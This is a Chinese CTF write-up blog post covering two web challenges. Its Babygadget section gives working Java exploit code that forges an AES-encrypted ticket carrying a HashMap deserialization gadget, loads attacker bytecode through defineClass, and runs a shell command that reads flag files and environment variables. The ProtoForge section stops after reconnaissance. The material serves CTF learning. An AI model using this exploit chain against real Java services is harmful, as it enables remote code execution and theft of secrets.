@@ -1,0 +1,323 @@
+---
+translationKey: shanghai-web-babygadget-protoforge
+locale: zh-cn
+routeSlug: shanghai-web-babygadget-protoforge
+title: 上海 Web 题解：Babygadget 与 ProtoForge
+excerpt: 记录 Babygadget 与 ProtoForge 两道 Web 题的附件分析、Java 反序列化利用链梳理和 Protobuf 网关题解思路。
+author: A1right
+seoTitle: 上海 Web 题解：Babygadget 与 ProtoForge
+seoDescription: A1right 整理上海 Web 题解，包含 Babygadget 反序列化分析、Legacy Ticket 构造与 ProtoForge Protobuf 网关信息收集。
+categoryKey: ctf-writeup
+category: CTF 题解
+tags:
+  - CTF
+  - Web 安全
+  - Java 反序列化
+  - Protobuf
+  - 题解
+visibility: public
+publishMode: now
+publishedAt: 2026-09-14
+updatedAt: 2026-09-14
+cover: /images/uploads/shanghai-web-cover.jpg
+coverAlt: 蓝色夜空下的金发动漫角色
+contentType: original
+allowRepost: allow-with-attribution
+pinned: false
+draft: false
+---
+
+# Babygadget
+
+## 题目描述：
+
+> 某集团正在推进统一身份认证中心升级。大部分业务系统已经切换到新的身份中台，但仍有少量老 OA、审批流和财务归档模块依赖历史客户端签发的 Legacy Access Ticket。
+>
+> 为了保证迁移窗口内业务不中断，运维团队临时保留了一个内网兼容网关：LegacyPass 身份桥。它会接收旧 OA 客户端导出的访问票据，并尝试恢复管理员兼容会话。
+>
+> 你作为安全审计人员，需要审计这个兼容网关，并在授权环境中拿到 flag。
+
+## 附件下载：
+
+> 链接：https://pan.baidu.com/s/1c29HvNrJVkwsVdxo0JKQWQ 
+> 提取码：x040 
+> --来自百度网盘超级会员V4的分享
+
+## 对附件反编译
+
+![image-20260905110507393](/images/uploads/shanghai-web-01.png)
+
+需要用到https://github.com/skylot/jadx/releases/tag/v1.5.6
+
+![image-20260905111243885](/images/uploads/shanghai-web-02.png)
+
+这里 99% 都是**第三方框架代码**（logback 日志、jackson JSON 库……），一个都不用看,业务代码藏在 `org` 包下面。
+
+在左侧树往下滚，找到 `org`，依次展开：
+
+```
+org
+ └─ ctf
+     └─ babygadget          ← 只有这 3 层下面的东西是要看的
+         ├── BabygadgetApplication
+         ├── controller
+         │    └─ Login      ← 点它
+         └─ util
+             ├── Crypto     ← 点它
+             └── HashCode   ← 点它
+```
+
+整个 `ch.qos.logback`、`com.fasterxml.jackson`、`javax`、`defpackage`（这些是日志库、JSON 库、JDK 类）全部跳过。
+
+### crypto包
+
+![image-20260905111643752](/images/uploads/shanghai-web-03.png)
+
+在crypto包中，我们看到了加密方式密钥 `TAKETHEAESKEY123`，IV `2026071620260716`,模式是 `AES/CBC/PKCS5Padding`,
+
+### 定位login包
+
+![image-20260905112336405](/images/uploads/shanghai-web-04.png)
+
+打开 jadx 里的 `Login` 类，找到 `restoreLegacySession` 方法。这段代码本质上是一条**加工流水线**，每一行对数据做一次变形：
+
+```
+输入: Authorization 头的值
+ ①startsWith("Bearer ") 检查       → 不带前缀直接拒绝
+ ②substring(7).trim()              → 掐掉 "Bearer " 前缀
+ ③URLDecoder.decode(token,"UTF-8") → URL 解码（%2F 变 / ，%3D 变 =）
+ ④Base64.getDecoder().decode(...)  → Base64 解码，得到密文字节
+ ⑤Crypto.aesDecrypt(...)           → AES 解密，得到明文字节 
+ ⑥new ObjectInputStream(...)       → 把明文当"Java 序列化流"解析
+ ⑦readObject()                     → 引爆点
+```
+
+第 ⑥ 步之后的代码就三行读取，对着 jadx 看长什么样：
+
+```
+long accessMarker = ticketStream.readLong();     // 第 1 段：读一个长整数
+String username = ticketStream.readUTF();        // 第 2 段：读一个字符串
+if (accessMarker != 9143923155895290750L || !ADMIN_USERNAME.equals(username)) {
+    return "Legacy ticket rejected";             // 两段不对就拒收
+}
+ticketStream.readObject();                       // 第 3 段：再读一个"对象"
+```
+
+所以一张合法票据 = 按同样顺序写出的三段：**一个特定的 long + 字符串 "admin" + 一个对象**。long 和字符串是“门票”，对象是我们想让它执行的东西。
+
+`readObject()` 会把字节流**还原成活的 Java 对象**——还原过程中会执行类自己的反序列化逻辑（构造、readObject、以及后面被 HashMap 触发的 hashCode）。也就是说：**我们给它什么字节，它就在服务器内存里“活”什么对象**。
+
+| Login.java 里的规则（读代码得到的）           | 票据要怎么造（构造请求时用的）        |
+| :-------------------------------------------- | :------------------------------------ |
+| 必须以 `Bearer `开头                          | 请求头写 `Authorization: Bearer xxx`  |
+| 值先 `URLDecoder.decode`                      | 票据最后要做 URL 编码                 |
+| 再 `Base64.decode`                            | 所以前一步要先做 Base64 **编码**      |
+| 再 `Crypto.aesDecrypt`（密钥/IV/模式已知）    | 所以前一步要先做 AES **加密**         |
+| 解密后 `readLong()` 要 = 9143923155895290750L | 加密前的明文**第 1 段**写这个 long    |
+| `readUTF()` 要 = "admin"                      | 明文**第 2 段**写 "admin"             |
+| `readObject()` 读任意对象                     | 明文**第 3 段**放我们想让它执行的东西 |
+
+## 信息收集
+
+![image-20260905105619080](/images/uploads/shanghai-web-05.png)
+
+![image-20260905120954415](/images/uploads/shanghai-web-06.png)
+
+雪瞳可以发现一个接口，
+
+![image-20260905121017349](/images/uploads/shanghai-web-07.png)
+
+反编译的代码我们也可以看到是post请求
+
+## 写 Forge.java 
+
+```java
+import java.io.*;
+import java.net.URLEncoder;
+import java.util.Base64;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+public class Forge {
+    public static void main(String[] args) throws Exception {
+        // ===== 第 1 步：按服务器读取的顺序，写出三段 =====
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(bos);
+        oos.writeLong(9143923155895290750L);   // 值来自 Login.java 的 ADMIN_ACCESS_MARKER 常量
+        oos.writeUTF("admin");                 // 值来自 Login.java 的 ADMIN_USERNAME 常量
+        oos.writeObject("hello");              // 第 3 段：无害对象占位，第 3 关会换掉它
+        oos.close();
+
+        // ===== 第 2 步：AES 加密（三个值全部来自 Crypto.java，Q1 你答对的）=====
+        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");   // Crypto.java 的 Cipher.getInstance 那行
+        cipher.init(Cipher.ENCRYPT_MODE,
+                new SecretKeySpec("TAKETHEAESKEY123".getBytes(), "AES"),      // AES_KEY 常量
+                new IvParameterSpec("2026071620260716".getBytes()));          // AES_IV 常量
+        byte[] enc = cipher.doFinal(bos.toByteArray());
+
+        // ===== 第 3 步：Base64 + URL 编码（顺序 = 服务器处理顺序的"倒放"）=====
+        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(enc), "UTF-8"));
+    }
+}
+```
+
+![image-20260905122045319](/images/uploads/shanghai-web-08.png)
+
+## 调用 hashCode()
+
+![image-20260905133104882](/images/uploads/shanghai-web-09.png)
+
+`defineClass + newInstance`（把字节码变成活的类并运行）**只存在于 `hashCode()` 这个方法**
+
+HashMap 还原时必须重建数组，重建必须问每个 key 要哈希——`putVal(hash(key), ...)`，`hash(key)` 第一步就是 `key.hashCode()`。
+
+```
+目标：让服务器执行我们的代码
+  ↑ 执行代码的机关只在 HashCode.hashCode() 方法里（出题人预埋的武器）
+  ↑ 但还原 ≠ 调用，得有"人"来调 hashCode()
+  ↑ 还原流程中会自动调 key.hashCode() 的 → HashMap（重建数组，源码已证）
+  ↑ 所以把 HashCode 塞进 HashMap 的 key
+  ↑ 把这个 HashMap 当票据第三段（替换掉 "hello"）
+  ↑ 服务器 readObject() → 还原 HashMap → 自动调 hashCode() → defineClass → 代码执行
+```
+
+## 动手：Gen2.java
+
+```java
+import org.ctf.babygadget.util.HashCode;   // 题目自带的类，第 1 关你读过的那个 gadget
+import java.io.*;
+import java.lang.reflect.Field;
+import java.net.URLEncoder;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.HashMap;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+public class Gen2 {
+    public static void main(String[] args) throws Exception {
+        // 【新增①】args[0] = 类字节文件路径（第 3 关用 Dummy.class / junk.bin，第 4 关换成恶意类）
+        byte[] payload = Files.readAllBytes(Paths.get(args[0]));
+
+        // 【新增②】造 HashCode 对象，把类字节塞进它的私有字段 ClassByte（反射才能碰私有字段）
+        HashCode hc = new HashCode();
+        Field f = HashCode.class.getDeclaredField("ClassByte");
+        f.setAccessible(true);
+        f.set(hc, Files.readAllBytes(Paths.get("Dummy.class")));   // 先放无害字节
+
+        // 【新增③】塞进 HashMap 当 key
+        //         注意：这一行在本机就会触发 hashCode() → defineClass(Dummy) —— 无害，
+        //         但它证明"put 必调 hashCode"，正是我们要利用的机制
+        HashMap<HashCode, String> m = new HashMap<>();
+        m.put(hc, "x");
+        System.out.println("[*] local put done (hashCode triggered locally, harmless)");
+
+        // 【新增④】put 之后再偷换字段为真载荷 —— 本地永远只碰无害字节，
+        //          序列化时写进流的已经是 args[0] 的内容
+        f.set(hc, payload);
+
+        // ===== 以下和 Forge.java 完全相同，只是第三段从 "hello" 换成了 m =====
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(bos);
+        oos.writeLong(9143923155895290750L);
+        oos.writeUTF("admin");
+        oos.writeObject(m);                          // ← 第三段升级
+        oos.close();
+
+        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        cipher.init(Cipher.ENCRYPT_MODE,
+                new SecretKeySpec("TAKETHEAESKEY123".getBytes(), "AES"),
+                new IvParameterSpec("2026071620260716".getBytes()));
+        byte[] enc = cipher.doFinal(bos.toByteArray());
+        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(enc), "UTF-8"));
+    }
+}
+```
+
+## 证明 defineClass 真的被调了
+
+## Pwn.java
+
+```java
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class Pwn {
+    static {   // static block: runs the moment the class is loaded & initialized
+        try {
+            // pitfall 1: use context classloader (can see spring/tomcat classes)
+            ClassLoader tcl = Thread.currentThread().getContextClassLoader();
+            Class<?> rch = tcl.loadClass("org.springframework.web.context.request.RequestContextHolder");
+            Object attrs = rch.getMethod("getRequestAttributes").invoke(null);
+            Class<?> sra = tcl.loadClass("org.springframework.web.context.request.ServletRequestAttributes");
+            Object resp = sra.getMethod("getResponse").invoke(attrs);
+            Class<?> respCls = tcl.loadClass("javax.servlet.http.HttpServletResponse");
+            Object os = respCls.getMethod("getOutputStream").invoke(resp);
+            Method write = os.getClass().getMethod("write", byte[].class);
+
+            String out = "";
+            try {
+                // execute command: whoami + list / + read flag files + env
+                Process p = new ProcessBuilder("sh", "-c",
+                        "id; ls -la /; cat /flag* /flag/* /app/flag* 2>/dev/null; env")
+                        .redirectErrorStream(true).start();
+                InputStream in = p.getInputStream();
+                ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                byte[] b = new byte[4096];
+                int n;
+                while ((n = in.read(b)) > 0) buf.write(b, 0, n);
+                out = new String(buf.toByteArray(), "UTF-8");
+            } catch (Throwable t1) {
+                out = "EXEC_FAIL: " + t1;
+                try { out += "\n[FILE] " + new String(Files.readAllBytes(Paths.get("/flag")), "UTF-8"); } catch (Throwable ig) {}
+                try { out += "\n[FILE] " + new String(Files.readAllBytes(Paths.get("/flag.txt")), "UTF-8"); } catch (Throwable ig) {}
+            }
+
+            write.invoke(os, out.getBytes("UTF-8"));
+            respCls.getMethod("flushBuffer").invoke(resp);   // pitfall 2: commit response, avoid Content-Length:37 truncation
+        } catch (Throwable t) {
+            throw new Error("PWN_FAIL: " + t);
+        }
+    }
+}
+```
+
+得到flag
+
+# **ProtoForge**
+
+## 题目描述：
+
+> ProtoForge 接收 Protobuf 格式的代码检查任务。Gateway 校验 V1 job，并为请求
+> 原文签发短期 ticket；Worker 随后处理同一份数据。
+> Worker 最近单独做过一次灰度升级，发布系统也留下了一些 HTTP 元数据。
+
+## 附件地址：
+
+> 链接：https://pan.baidu.com/s/1FZ-eXwSykbZsmBb9l9uRGA 
+> 提取码：6bql 
+> --来自百度网盘超级会员V4的分享
+
+![image-20260905140206417](/images/uploads/shanghai-web-10.png)
+
+## 信息收集：
+
+![image-20260905140335351](/images/uploads/shanghai-web-11.png)
+
+## 页面写的很清楚：
+
+> Lint before ship.
+>
+> Gateway validates and seals a Protobuf job. The isolated worker executes only the signed bytes.
+>
+> （网关校验并签封一个Protobuf任务，隔离的worker只执行被签名的字节）
+
+
+
+
